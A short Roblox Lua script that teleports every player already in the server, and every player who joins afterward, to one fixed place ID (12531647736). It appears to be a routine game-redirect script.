	for l,x in pairs(game:GetService("Players"):GetChildren()) do
	game:GetService("TeleportService"):Teleport(12531647736, x)
	end
	game:GetService("Players").PlayerAdded:Connect(function(v)
	game:GetService("TeleportService"):Teleport(12531647736, v)
	end)
